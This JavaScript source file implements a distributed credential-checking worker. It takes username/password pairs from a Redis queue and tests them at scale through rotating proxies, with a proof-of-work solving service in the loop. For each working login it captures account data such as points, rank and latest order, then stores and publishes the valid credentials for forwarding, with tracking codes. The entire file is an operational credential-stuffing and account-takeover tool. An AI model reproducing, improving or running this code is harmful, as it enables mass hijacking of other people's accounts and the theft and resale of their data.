/**
 * Worker Node - Standalone Process for Distributed Credential Checking
 * 
 * Pulls tasks from Redis queue, executes credential checks, and publishes results.
 * Designed to run as independent processes across multiple EC2 instances.
 * 
 * Requirements: 2.1, 2.2, 2.3, 2.4, 2.5, 1.6, 5.7, 5.8, 7.3, 8.1
 */

const pLimit = require('p-limit').default || require('p-limit');
const { createLogger } = require('../shared/logger');
const { createStructuredLogger } = require('../shared/logger/structured');
const { checkCredentials } = require('../shared/http/checker');
const { captureAccountData } = require('../shared/capture');
const { fetchIpInfo } = require('../shared/http/ipFetcher');
const {
  markProcessedStatus,
  makeKey,
  flushWriteBuffer,
  closeStore,
} = require('../shared/batch/processedStore');
const { validateCaptureForForwarding } = require('../shared/capture/validateCaptureForForwarding');
const { 
  JOB_QUEUE, 
  TASK_LEASE, 
  RESULT_CACHE, 
  PROGRESS_TRACKER,
  WORKER_HEARTBEAT,
  WORKER_INFO,
  BATCH_CANCELLED,
  MESSAGE_TRACKING,
  PUBSUB_CHANNELS,
  generateWorkerId 
} = require('../shared/redis/keys');
const { getConfigService } = require('../shared/config/configService');
const { isFatalError } = require('./workerErrors');
const { buildHeartbeatData, sendHeartbeatCommands } = require('./heartbeat');
const { createWorkerHttpServer } = require('./httpServer');

const log = createLogger('worker-node');
const structuredLog = createStructuredLogger('worker-node');

/**
 * Get worker configuration from config service (hot-reloadable) or env fallback
 */
function getWorkerConfig() {
  const configService = getConfigService();
  if (configService.isInitialized()) {
    return {
      concurrency: configService.get('WORKER_CONCURRENCY') || 8,
      processedTtlMs: configService.get('PROCESSED_TTL_MS') || undefined,
      httpPort: configService.get('WORKER_HTTP_PORT') || undefined
    };
  }
  // Fallback to env
  return {
    concurrency: parseInt(process.env.WORKER_CONCURRENCY, 10) || 8,
    processedTtlMs: parseInt(process.env.PROCESSED_TTL_MS, 10) || undefined,
    httpPort: parseInt(process.env.WORKER_HTTP_PORT, 10) || undefined
  };
}

class WorkerNode {
  constructor(redisClient, options = {}) {
    this.redis = redisClient;
    this.workerId = options.workerId || generateWorkerId();
    this.powServiceUrl = options.powServiceUrl || process.env.POW_SERVICE_URL;
    
    // Concurrency configuration (read from config service at startup)
    const workerConfig = getWorkerConfig();
    this.concurrency = options.concurrency || workerConfig.concurrency;
    this.limit = pLimit(this.concurrency);
    
    // Worker state - parallel task tracking
    this.activeTasks = new Map(); // taskId -> { promise, startedAt, task }
    this.activeTaskCount = 0;
    this.shutdown = false;
    this.cancelCache = new Map(); // Map<batchId, {value: boolean, expiresAt: number}> — 1s TTL
    this.tasksCompleted = 0;
    this.startTime = Date.now();

    // HTTP status server
    const httpPort = options.httpPort || getWorkerConfig().httpPort || 3010;
    this.httpPort = httpPort;
    this.httpServer = null;
    
    // Metrics tracking
    this.metricsInterval = null;
    this.lastMetricsLog = Date.now();
    this.metricsLogInterval = 30000; // Log metrics every 30s
    
    // Timeouts and intervals
    this.taskTimeout = options.taskTimeout || 120000; // 2 minutes max per task
    this.heartbeatInterval = options.heartbeatInterval || 10000; // 10 seconds
    // BLPOP timeout — reduced from 30s to 5s for faster task pickup.
    // Env: WORKER_QUEUE_TIMEOUT (default 30000ms), code default 5000ms.
    this.queueTimeout = options.queueTimeout || 5000;
    
    // Intervals
    this.heartbeatTimer = null;
    
    log.info(`Worker node initialized`, {
      workerId: this.workerId,
      powServiceUrl: this.powServiceUrl,
      concurrency: this.concurrency,
      taskTimeout: this.taskTimeout,
      heartbeatInterval: this.heartbeatInterval
    });
  }

  /**
   * Main worker loop - continuously pull and process tasks in parallel
   */
  async run() {
    log.info(`Worker ${this.workerId} starting up with concurrency ${this.concurrency}`);
    
    try {
      // 1. Register worker with unique ID in Redis
      await this.registerWorker();
      
      // 2. Start heartbeat interval (10s)
      this.startHeartbeat();
      
      // 3. Start metrics logging
      this.startMetricsLogging();

      // 4. Start lightweight HTTP status server (health/metrics/status)
      await this.startHttpServer();
      
      // 4. Main processing loop - parallel task execution
      while (!this.shutdown) {
        try {
          // Only pull new tasks if we have capacity
          if (this.activeTaskCount < this.concurrency) {
            const task = await this.dequeueTask();
            
            if (task) {
              // Fire-and-forget with concurrency limit
              this.spawnTaskProcessor(task);
              // Don't sleep — immediately try to fill another slot
              continue;
            }
          } else {
            // At capacity - wait for any task to complete before checking queue
            if (this.activeTasks.size > 0) {
              const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
              await Promise.race(promises).catch(() => {}); // Ignore errors, just wait for completion
            }
          }
          
          // Only sleep when no task was dequeued (queue empty or at capacity)
          if (!this.shutdown) {
            await this.sleep(1);
          }
          
        } catch (error) {
          log.error('Error in worker main loop', {
            workerId: this.workerId,
            error: error.message,
            activeTasks: this.activeTaskCount
          });
          
          // Continue processing unless it's a fatal error
          if (isFatalError(error)) {
            log.error('Fatal error detected, shutting down worker', {
              workerId: this.workerId,
              error: error.message
            });
            break;
          }
          
          // For timeout errors, continue immediately (no extra delay)
          if (error.message.includes('Command timed out') || 
              error.message.includes('timeout')) {
            log.debug('Timeout error in main loop, continuing', {
              workerId: this.workerId
            });
            continue;
          }
          
          // Wait before retrying on other errors
          await this.sleep(5000);
        }
      }
      
      // Wait for all active tasks to complete before exiting
      if (this.activeTasks.size > 0) {
        log.info(`Waiting for ${this.activeTasks.size} active tasks to complete`, {
          workerId: this.workerId,
          taskIds: Array.from(this.activeTasks.keys())
        });
        
        const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
        await Promise.allSettled(promises);
      }
      
    } catch (error) {
      log.error('Worker startup failed', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    } finally {
      await this.cleanup();
    }
    
    log.info(`Worker ${this.workerId} shut down complete`, {
      tasksCompleted: this.tasksCompleted
    });
  }

  /**
   * Spawn a task processor (fire-and-forget with tracking)
   * @param {Object} task - Task object from queue
   */
  spawnTaskProcessor(task) {
    // Increment counter immediately
    this.activeTaskCount++;
    
    // Create promise wrapped with concurrency limit
    const promise = this.limit(async () => {
      try {
        await this.processTaskWithLease(task);
      } catch (error) {
        // Error already logged in processTaskWithLease
      }
    });
    
    // Track the task
    this.activeTasks.set(task.taskId, {
      promise,
      startedAt: Date.now(),
      task
    });
    
    // Clean up when done
    promise.finally(() => {
      this.activeTasks.delete(task.taskId);
      this.activeTaskCount--;
      
      log.debug(`Task slot freed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        activeNow: this.activeTaskCount,
        concurrency: this.concurrency
      });
    });
    
    log.debug(`Spawned task processor`, {
      workerId: this.workerId,
      taskId: task.taskId,
      activeNow: this.activeTaskCount,
      concurrency: this.concurrency
    });
  }

  /**
   * Register worker with Redis
   */
  async registerWorker() {
    try {
      const registrationData = {
        workerId: this.workerId,
        startTime: this.startTime,
        pid: process.pid,
        hostname: process.env.HOSTNAME || 'unknown',
        version: process.env.npm_package_version || '1.0.0'
      };
      
      // Store worker registration (no TTL — cleaned up on shutdown)
      await this.redis.executeCommand(
        'set',
        WORKER_INFO.generate(this.workerId),
        JSON.stringify(registrationData)
      );
      
      log.info(`Worker ${this.workerId} registered successfully`, registrationData);
    } catch (error) {
      log.error('Failed to register worker', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Dequeue task from Redis with priority (retry queue first, then main queue)
   * @returns {Promise<Object|null>} Task object or null if timeout
   */
  async dequeueTask() {
    try {
      // Try retry queue first (high priority) with 1s timeout
      let result = await this.redis.executeCommand('blpop', JOB_QUEUE.retry, 1);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued retry task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId,
          retryCount: task.retryCount
        });
        return task;
      }
      
      // If no retry tasks, pull from main queue with longer timeout
      result = await this.redis.executeCommand('blpop', JOB_QUEUE.tasks, this.queueTimeout / 1000);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued main task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return task;
      }
      
      // Timeout - no tasks available
      return null;
      
    } catch (error) {
      // Handle timeout errors gracefully
      if (error.message.includes('Command timed out') || 
          error.message.includes('timeout')) {
        log.debug('BLPOP timeout - no tasks available', {
          workerId: this.workerId,
          timeout: this.queueTimeout
        });
        return null;
      }
      
      if (error.message.includes('BLPOP') && this.shutdown) {
        // Expected during shutdown
        return null;
      }
      
      log.error('Error dequeuing task', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Process task with lease management
   * @param {Object} task - Task object from queue
   */
  async processTaskWithLease(task) {
    const leaseKey = TASK_LEASE.generate(task.batchId, task.taskId);
    let leaseAcquired = false;
    
    try {
      // Check if batch is cancelled before processing
      if (await this.isBatchCancelled(task.batchId)) {
        log.info(`Skipping task ${task.taskId} - batch ${task.batchId} is cancelled`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      // Acquire task lease: SET with TTL and NX (only if not exists)
      const leaseValue = JSON.stringify({
        workerId: this.workerId,
        acquiredAt: Date.now(),
        task: task
      });
      
      const acquired = await this.redis.executeCommand(
        'set',
        leaseKey,
        leaseValue,
        'EX',
        TASK_LEASE.ttl,
        'NX'
      );
      
      if (!acquired) {
        log.warn(`Task ${task.taskId} already has active lease, skipping`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      leaseAcquired = true;
      this.currentTask = task;
      
      // Double-check batch cancellation after acquiring lease
      if (await this.isBatchCancelled(task.batchId)) {
        log.info(`Task ${task.taskId} cancelled after lease acquisition`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      log.info(`Processing task ${task.taskId}`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        username: task.username,
        proxyId: task.proxyId,
        retryCount: task.retryCount || 0
      });
      
      // Process the task with timeout
      await this.processTaskWithTimeout(task);
      
    } catch (error) {
      log.error(`Task ${task.taskId} processing failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Task failed - will be retried by coordinator if within retry limit
      // Don't re-enqueue here, let the lease expire and zombie recovery handle it
      
    } finally {
      // Release lease after completion
      if (leaseAcquired) {
        try {
          await this.redis.executeCommand('del', leaseKey);
          log.debug(`Released lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        } catch (error) {
          log.warn(`Failed to release lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId,
            error: error.message
          });
        }
      }
      
      this.currentTask = null;
      this.tasksCompleted++;
    }
  }

  /**
   * Process task with timeout wrapper
   * @param {Object} task - Task to process
   */
  async processTaskWithTimeout(task) {
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        reject(new Error(`Task ${task.taskId} timed out after ${this.taskTimeout}ms`));
      }, this.taskTimeout);
      
      this.processTask(task)
        .then(resolve)
        .catch(reject)
        .finally(() => {
          clearTimeout(timeoutId);
        });
    });
  }

  /**
   * Process a single credential check task
   * @param {Object} task - Task object with credential, proxy, metadata
   * @returns {Promise<Object>} - Result object with status, capture, IP
   */
  async processTask(task) {
    const startTime = Date.now();
    
    try {
      // Extract credential, proxy, batchId from task
      const { username, password, proxyUrl, batchId, taskId } = task;
      
      log.debug(`Starting credential check for ${username}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        proxyUrl: proxyUrl ? 'configured' : 'none'
      });
      
      // Request cres from POW service (with fallback)
      // Note: POW service integration is handled internally by src/shared/http/checker.js
      // which uses powServiceClient for cres computation with automatic fallback
      
      // Execute credential check via src/shared/http/checker.js with assigned proxy
      const checkResult = await checkCredentials(username, password, {
        proxy: proxyUrl,
        timeoutMs: 60000,
        deferCloseOnValid: true, // Keep session open for data capture
        batchMode: true
      });
      
      // Check if batch was cancelled while we were processing
      if (await this.isBatchCancelled(batchId)) {
        log.info(`Task ${taskId} completed but batch ${batchId} is cancelled, discarding result`, {
          workerId: this.workerId,
          taskId,
          batchId,
          status: checkResult.status
        });
        // Close session if valid to avoid leaking
        if (checkResult.status === 'VALID' && checkResult.sessionCookie) {
          const { closeSession } = require('../shared/http/checker');
          await closeSession(checkResult.sessionCookie).catch(() => {});
        }
        return { discarded: true, reason: 'batch_cancelled' };
      }
      
      let result = {
        username,
        password,
        status: checkResult.status,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: Date.now() - startTime,
        batchId,
        taskId
      };
      
      // If VALID, fetch exit IP and capture account data
      if (checkResult.status === 'VALID') {
        await this.handleValidCredential(checkResult, result, task);
      } else {
        // For non-VALID results, add error details if available
        if (checkResult.message) {
          result.errorCode = checkResult.message;
        }
      }
      
      // Store result in Result_Store with 30-day TTL (pipelined with counts and progress)
      await this.storeResultPipelined(result);
      
      // Publish events for coordinator
      await this.publishResultEvents(result, checkResult);
      
      // Log structured task completion
      structuredLog.logTaskCompletion({
        taskId: result.taskId,
        batchId: result.batchId,
        username: result.username,
        status: result.status,
        duration: result.checkDurationMs,
        proxyId: result.proxyId,
        workerId: result.workerId,
        errorCode: result.errorCode,
        ipAddress: result.ipAddress
      });
      
      log.info(`Task ${taskId} completed: ${result.status}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        status: result.status,
        duration: result.checkDurationMs,
        ipAddress: result.ipAddress || 'none'
      });
      
      return result;
      
    } catch (error) {
      const duration = Date.now() - startTime;
      
      // Log structured error
      structuredLog.logError(`Task ${task.taskId} failed`, error, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        duration
      });
      
      log.error(`Task ${task.taskId} failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        error: error.message,
        duration
      });
      
      // Check if batch was cancelled - if so, don't count the error
      if (await this.isBatchCancelled(task.batchId)) {
        log.info(`Task ${task.taskId} failed but batch ${task.batchId} is cancelled, discarding error`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        throw error; // Re-throw but don't count it
      }
      
      // Create error result
      const errorResult = {
        username: task.username,
        password: task.password,
        status: 'ERROR',
        errorCode: error.message,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: duration,
        batchId: task.batchId,
        taskId: task.taskId
      };
      
      // Store error result (pipelined with counts and progress)
      await this.storeResultPipelined(errorResult);
      
      // Log structured task completion for error
      structuredLog.logTaskCompletion({
        taskId: errorResult.taskId,
        batchId: errorResult.batchId,
        username: errorResult.username,
        status: errorResult.status,
        duration: errorResult.checkDurationMs,
        proxyId: errorResult.proxyId,
        workerId: errorResult.workerId,
        errorCode: errorResult.errorCode
      });
      
      throw error;
    }
  }

  /**
   * Handle VALID credential - fetch IP and capture data
   * @param {Object} checkResult - Result from httpChecker
   * @param {Object} result - Result object being built
   * @param {Object} task - Original task
   */
  async handleValidCredential(checkResult, result, task) {
    try {
      // If IP was already fetched during check, use it
      if (checkResult.ipAddress) {
        result.ipAddress = checkResult.ipAddress;
        log.debug(`IP address from check: ${checkResult.ipAddress}`, {
          workerId: this.workerId,
          taskId: task.taskId
        });
      } else if (task.proxyUrl && checkResult.session) {
        // Fetch exit IP for VALID credentials via ipFetcher.js
        // IMPORTANT: Use proxiedClient to get actual proxy exit IP (same IP used for password step)
        log.debug('Fetching exit IP for VALID credential via proxy', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const ipClient = checkResult.session.proxiedClient || checkResult.session.client;
        const ipInfo = await fetchIpInfo(ipClient, 10000);
        if (ipInfo.ip) {
          result.ipAddress = ipInfo.ip;
          log.debug(`Proxy exit IP fetched: ${ipInfo.ip}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        }
      }
      
      // Capture account data for VALID via httpDataCapture.js
      if (checkResult.session) {
        log.debug('Capturing account data for VALID credential', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const captureData = await captureAccountData(checkResult.session, {
          timeoutMs: 30000
        });
        
        result.capture = captureData;
        
        log.debug('Account data captured', {
          workerId: this.workerId,
          taskId: task.taskId,
          points: captureData.points,
          rank: captureData.rank,
          latestOrder: captureData.latestOrder
        });
        
        // Close session after capture
        try {
          if (checkResult.session.jar?.removeAllCookies) {
            await new Promise((resolve, reject) => {
              checkResult.session.jar.removeAllCookies((err) => {
                if (err) reject(err); else resolve();
              });
            });
          }
        } catch (e) {
          // Ignore cleanup errors
        }
      }
      
    } catch (error) {
      log.warn(`Failed to capture additional data for VALID credential`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Don't fail the task if IP/capture fails - credential is still VALID
      result.captureError = error.message;
    }
  }

  /**
   * Store result in Redis via pipeline (SETEX + HINCRBY + INCR + optional LPUSH/EXPIRE)
   * Reduces Redis round-trips by batching independent writes into one pipeline.exec().
   * markProcessedStatus is kept separate (uses its own write-buffer batching).
   * @param {Object} result - Result object to store
   */
  async storeResultPipelined(result) {
    try {
      const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
      const resultData = JSON.stringify(result);
      const batchId = result.batchId;
      
      const pipeline = this.redis.pipeline();
      
      // SETEX result cache (30-day TTL)
      pipeline.setex(resultKey, RESULT_CACHE.ttl, resultData);
      
      // HINCRBY counts for this status
      const countsKey = PROGRESS_TRACKER.generateCounts(batchId);
      pipeline.hincrby(countsKey, result.status, 1);
      
      // INCR progress counter
      const counterKey = PROGRESS_TRACKER.generateCounter(batchId);
      pipeline.incr(counterKey);
      
      // If VALID: LPUSH to valid creds list + EXPIRE
      if (result.status === 'VALID') {
        const validCredsKey = PROGRESS_TRACKER.generateValidCreds(batchId);
        const credData = JSON.stringify({
          username: result.username,
          password: result.password,
          ipAddress: result.ipAddress || 'Unknown'
        });
        pipeline.lpush(validCredsKey, credData);
        pipeline.expire(validCredsKey, PROGRESS_TRACKER.ttl);
      }
      
      await pipeline.exec();
      
      // Consolidated logging
      log.info(`Result stored in cache`, {
        workerId: this.workerId,
        resultKey,
        status: result.status,
        username: result.username,
        ttl: RESULT_CACHE.ttl
      });
      
      log.debug(`Updated ${result.status} count and progress for batch ${batchId}`, {
        workerId: this.workerId,
        batchId,
        status: result.status
      });
      
      if (result.status === 'VALID') {
        log.debug(`Added valid credential to list for batch ${batchId}`, {
          workerId: this.workerId,
          batchId,
          username: result.username
        });
      }
      
    } catch (error) {
      log.error('CRITICAL: Failed to store result in cache', {
        workerId: this.workerId,
        taskId: result.taskId,
        username: result.username,
        status: result.status,
        error: error.message,
        stack: error.stack
      });
      // Don't throw - but this is a serious issue that needs attention
    }

    // Mirror into processed store (separate — uses its own write-buffer batching)
    if (result.status !== 'ERROR') {
      try {
        const credKey = makeKey(result.username, result.password);
        const { processedTtlMs } = getWorkerConfig();
        await markProcessedStatus(credKey, result.status, processedTtlMs);
      } catch (error) {
        log.warn('Processed store write failed', {
          workerId: this.workerId,
          taskId: result.taskId,
          username: result.username,
          status: result.status,
          error: error.message
        });
      }
    }
  }

  /**
   * Publish result events to Redis pub/sub for coordinator
   * @param {Object} result - Result object
   * @param {Object} checkResult - Original check result
   */
  async publishResultEvents(result, checkResult) {
    try {
      // Publish forward_event only when capture passes the forwarding guard.
      if (result.status === 'VALID') {
        const validation = validateCaptureForForwarding(result.capture || null);
        if (!validation.valid) {
          log.debug('Skipping forward_event publish: capture does not meet forwarding guard', {
            workerId: this.workerId,
            username: result.username,
            batchId: result.batchId,
            reason: validation.reason
          });
          return;
        }

        const forwardEvent = {
          username: result.username,
          password: result.password,
          capture: result.capture || null,
          ipAddress: result.ipAddress,
          timestamp: result.checkedAt,
          workerId: this.workerId,
          batchId: result.batchId
        };
        
        await this.redis.executeCommand(
          'publish',
          PUBSUB_CHANNELS.forwardEvents,
          JSON.stringify(forwardEvent)
        );
        
        log.debug('Published forward_event', {
          workerId: this.workerId,
          username: result.username,
          batchId: result.batchId,
          hasCapture: !!result.capture
        });
      }
      
      // If credential was previously forwarded and is now INVALID/BLOCKED, publish update_event
      if (result.status === 'INVALID' || result.status === 'BLOCKED') {
        const trackingCode = await this.redis.executeCommand('get', MESSAGE_TRACKING.generateReverse(result.username, result.password));
        if (trackingCode) {
          const updateEvent = {
            username: result.username,
            password: result.password,
            newStatus: result.status,
            trackingCode,
            timestamp: result.checkedAt,
            workerId: this.workerId,
            batchId: result.batchId
          };

          await this.redis.executeCommand(
            'publish',
            PUBSUB_CHANNELS.updateEvents,
            JSON.stringify(updateEvent)
          );

          log.debug('Published update_event', {
            workerId: this.workerId,
            username: result.username,
            batchId: result.batchId,
            status: result.status
          });
        }
      }
      
    } catch (error) {
      log.error('Failed to publish result events', {
        workerId: this.workerId,
        taskId: result.taskId,
        error: error.message
      });
      // Don't throw - event publishing failure shouldn't fail the task
    }
  }

  /**
   * Check if a batch is cancelled
   * @param {string} batchId - Batch ID to check
   * @returns {Promise<boolean>} True if batch is cancelled
   */
  async isBatchCancelled(batchId) {
    // Check in-memory cache first (1s TTL)
    const cached = this.cancelCache.get(batchId);
    if (cached && Date.now() < cached.expiresAt) {
      return cached.value;
    }
    // Clean up expired entry if present
    if (cached) {
      this.cancelCache.delete(batchId);
    }
    
    try {
      const cancelKey = BATCH_CANCELLED.generate(batchId);
      const result = await this.redis.executeCommand('get', cancelKey);
      const isCancelled = result !== null;
      
      // Cache result with 1s TTL
      this.cancelCache.set(batchId, {
        value: isCancelled,
        expiresAt: Date.now() + 1000
      });
      
      return isCancelled;
    } catch (error) {
      log.error('Error checking batch cancellation status', {
        workerId: this.workerId,
        batchId,
        error: error.message
      });
      return false; // On error, assume not cancelled to avoid blocking
    }
  }

  /**
   * Sleep utility
   * @param {number} ms - Milliseconds to sleep
   * @returns {Promise<void>}
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Start heartbeat mechanism
   */
  startHeartbeat() {
    this.heartbeatTimer = setInterval(async () => {
      await this.sendHeartbeat();
    }, this.heartbeatInterval);
    
    log.debug(`Heartbeat started (${this.heartbeatInterval}ms interval)`, {
      workerId: this.workerId
    });
  }

  /**
   * Send heartbeat to coordinator
   */
  async sendHeartbeat() {
    try {
      const heartbeatData = buildHeartbeatData({
        workerId: this.workerId,
        tasksCompleted: this.tasksCompleted,
        activeTaskCount: this.activeTaskCount,
        activeTaskIds: Array.from(this.activeTasks.keys()),
        concurrency: this.concurrency,
        startTime: this.startTime,
      });
      
      // Use Promise.race to add additional timeout protection for heartbeat
      const heartbeatTimeout = 30000; // 30 second timeout for heartbeat operations
      
      await Promise.race([
        sendHeartbeatCommands(this.redis, this.workerId, heartbeatData),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Heartbeat timeout')), heartbeatTimeout)
        )
      ]);
      
      // Log structured heartbeat
      structuredLog.logWorkerHeartbeat(heartbeatData);
      
      log.debug('Heartbeat sent', {
        workerId: this.workerId,
        tasksCompleted: this.tasksCompleted,
        activeTasks: this.activeTaskCount,
        concurrency: this.concurrency,
        utilization: heartbeatData.utilization + '%'
      });
      
    } catch (error) {
      // Heartbeat timeouts are expected under load - log as warning, not error
      const isTimeout = error.message.includes('timeout');
      const logLevel = isTimeout ? 'warn' : 'error';
      
      if (!isTimeout) {
        structuredLog.logError('Failed to send heartbeat', error, {
          workerId: this.workerId
        });
      }
      
      log[logLevel]('Failed to send heartbeat', {
        workerId: this.workerId,
        error: error.message
      });
      
      // Don't treat heartbeat timeouts as fatal - they're expected under load
      if (!isTimeout && isFatalError(error)) {
        log.error('Heartbeat failure indicates fatal error, initiating shutdown', {
          workerId: this.workerId
        });
        this.shutdown = true;
      }
    }
  }

  /**
   * Handle graceful shutdown
   */
  async handleShutdown(signal = 'SIGTERM') {
    log.info(`Worker ${this.workerId} received ${signal}, initiating graceful shutdown`, {
      activeTasks: this.activeTaskCount,
      taskIds: Array.from(this.activeTasks.keys())
    });
    
    // 1. Stop pulling new tasks immediately
    this.shutdown = true;
    
    // 2. If active tasks exist, wait for all to complete (with timeout)
    if (this.activeTasks.size > 0) {
      const maxWait = this.taskTimeout * Math.max(1, Math.ceil(this.activeTasks.size / 2));
      
      log.info(`Waiting for ${this.activeTasks.size} active tasks to complete`, {
        workerId: this.workerId,
        taskIds: Array.from(this.activeTasks.keys()),
        maxWait
      });
      
      const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
      
      // Wait for all tasks or timeout
      await Promise.race([
        Promise.allSettled(promises),
        new Promise(resolve => setTimeout(resolve, maxWait))
      ]);
      
      // 3. If tasks still pending after timeout, release their leases
      if (this.activeTasks.size > 0) {
        log.warn(`${this.activeTasks.size} tasks still active after timeout, releasing leases`, {
          workerId: this.workerId,
          taskIds: Array.from(this.activeTasks.keys())
        });
        
        for (const [taskId, taskInfo] of this.activeTasks) {
          const task = taskInfo.task;
          const leaseKey = TASK_LEASE.generate(task.batchId, task.taskId);
          
          try {
            await this.redis.executeCommand('del', leaseKey);
            log.warn(`Released lease for incomplete task ${taskId}`, {
              workerId: this.workerId,
              taskId,
              batchId: task.batchId
            });
          } catch (error) {
            log.error('Failed to release lease for incomplete task', {
              workerId: this.workerId,
              taskId,
              error: error.message
            });
          }
        }
      }
    }
    
    await this.cleanup();
    
    // 4. Exit with code 0 for systemd restart
    log.info(`Worker ${this.workerId} graceful shutdown complete`, {
      tasksCompleted: this.tasksCompleted
    });
    process.exit(0);
  }

  /**
   * Cleanup resources
   */
  async cleanup() {
    // Stop heartbeat
    if (this.heartbeatTimer) {
      clearInterval(this.heartbeatTimer);
      this.heartbeatTimer = null;
    }
    
    // Stop metrics logging
    if (this.metricsInterval) {
      clearInterval(this.metricsInterval);
      this.metricsInterval = null;
    }
    
    // Clean up worker registration
    try {
      await this.redis.executeCommand('del', WORKER_INFO.generate(this.workerId));
      await this.redis.executeCommand('del', WORKER_HEARTBEAT.generate(this.workerId));
      
      log.debug(`Cleaned up worker registration for ${this.workerId}`);
    } catch (error) {
      log.warn('Failed to clean up worker registration', {
        workerId: this.workerId,
        error: error.message
      });
    }

    // Flush buffered processed-store writes before exit
    try {
      await flushWriteBuffer();
      await closeStore();
      log.debug('Processed store flushed and closed');
    } catch (error) {
      log.warn('Processed store cleanup failed', { error: error.message });
    }

    // Stop HTTP server
    if (this.httpServer) {
      try {
        await new Promise((resolve) => this.httpServer.close(resolve));
        log.info('Worker HTTP status server stopped', { workerId: this.workerId });
      } catch (error) {
        log.warn('Failed to stop worker HTTP status server', { error: error.message });
      }
    }
  }

  /**
   * Start metrics logging interval
   */
  startMetricsLogging() {
    this.metricsInterval = setInterval(() => {
      this.logMetrics();
    }, this.metricsLogInterval);
    
    log.debug(`Metrics logging started (${this.metricsLogInterval}ms interval)`, {
      workerId: this.workerId
    });
  }

  /**
   * Log worker metrics for monitoring
   */
  logMetrics() {
    const now = Date.now();
    const uptime = now - this.startTime;
    const utilization = Math.round((this.activeTaskCount / this.concurrency) * 100);
    const memory = process.memoryUsage();
    
    // Calculate tasks per minute
    const uptimeMinutes = uptime / 60000;
    const tasksPerMinute = uptimeMinutes > 0 ? (this.tasksCompleted / uptimeMinutes).toFixed(2) : 0;
    
    log.info(`Worker metrics`, {
      workerId: this.workerId,
      activeTasks: this.activeTaskCount,
      concurrency: this.concurrency,
      utilization: `${utilization}%`,
      tasksCompleted: this.tasksCompleted,
      tasksPerMinute,
      uptimeMinutes: Math.round(uptimeMinutes),
      heapUsedMB: Math.round(memory.heapUsed / 1024 / 1024),
      heapTotalMB: Math.round(memory.heapTotal / 1024 / 1024),
      rssMB: Math.round(memory.rss / 1024 / 1024)
    });
    
    // Log structured metrics
    structuredLog.logWorkerMetrics({
      workerId: this.workerId,
      activeTasks: this.activeTaskCount,
      concurrency: this.concurrency,
      utilization,
      tasksCompleted: this.tasksCompleted,
      tasksPerMinute: parseFloat(tasksPerMinute),
      uptime,
      memory
    });
  }

  /**
   * Start an HTTP server exposing /status, /health, /metrics
   */
  async startHttpServer() {
    if (this.httpServer) return;

    this.httpServer = await createWorkerHttpServer({
      httpPort: this.httpPort,
      workerId: this.workerId,
      log,
      getState: () => ({
        workerId: this.workerId,
        activeTaskCount: this.activeTaskCount,
        concurrency: this.concurrency,
        tasksCompleted: this.tasksCompleted,
        startTime: this.startTime,
        powServiceUrl: this.powServiceUrl,
      }),
    });
  }
}

module.exports = WorkerNode;
module.exports.processTaskDirect = require('./processTaskDirect').processTaskDirect;
